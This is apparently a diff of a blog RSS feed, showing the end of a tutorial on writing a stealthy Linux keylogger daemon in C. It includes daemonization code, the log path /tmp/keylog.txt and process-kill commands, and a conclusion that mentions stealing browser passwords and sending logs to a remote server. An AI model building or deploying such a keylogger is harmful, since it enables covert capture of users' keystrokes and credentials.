+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    /* Change the current working directory */
+</span></span><span class="line"><span class="cl">    if ((chdir(&#34;/&#34;)) &lt; 0) {
+</span></span><span class="line"><span class="cl">        /* Log the failure */
+</span></span><span class="line"><span class="cl">        exit(EXIT_FAILURE);
+</span></span><span class="line"><span class="cl">    }
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    /* Close out the standard file descriptors */
+</span></span><span class="line"><span class="cl">    //Because daemons generally dont interact directly with user so there is no need of keeping these open
+</span></span><span class="line"><span class="cl">    close(STDIN_FILENO);
+</span></span><span class="line"><span class="cl">    close(STDOUT_FILENO);
+</span></span><span class="line"><span class="cl">    close(STDERR_FILENO);
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    return(pid);
+</span></span><span class="line"><span class="cl">}
+</span></span></code></pre></div><p>After compiling and executing this code. We get a decent exit message like this.</p>
+<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/640/1*y_eJXDhm9j1vkrAzajJUEA.png" alt=""  />
+</p>
+<p>But we can check from the <strong>/tmp/keylog.txt</strong> file that the program is still adding key events to the file. Use <code>tail -f /tmp/keylog.txt</code> command to check appending logs.</p>
+<p>You can look for the process using <code>ps -A | grep 'your_binary_name'</code> command to get the process ID of the daemon keylogger running behind the scene. And then kill it by using <code>kill -9 &lt;processID&gt;</code>.</p>
+<hr>
+<h3 id="conclusion">Conclusion.</h3>
+<p>You can take this blog as an educational purpose demo that even the least suspecting program from any untrusted source can be malicious and can do a lot of things you have not expected it to do.
+We can create simple programs, that can read the whole file system to know what programs you use.. get the files with sensitive information.. passwords stored in the browsers.. setup a trojan.. and what not.
+Also with small modifications, I can send all the logs created locally to a remote server.</p>
+<p>This program is only tested in a bare-metal linux system. This can&rsquo;t work on windows (because they have different system calls and API to work) and this is also not working in VM for some reason which I am trying to figure out why. If you have any knowledge regarding this, please feel free to reach out and help me to understand the problem.</p>
+<p>All this code is present in github repo here -&gt; (<a href="https://github.com/ayedaemon/C-practice/tree/master/lin-c/keylogger">https://github.com/ayedaemon/C-practice/tree/master/lin-c/keylogger</a>)</p>]]></content:encoded>
     </item>
+    
   </channel>
 </rss>
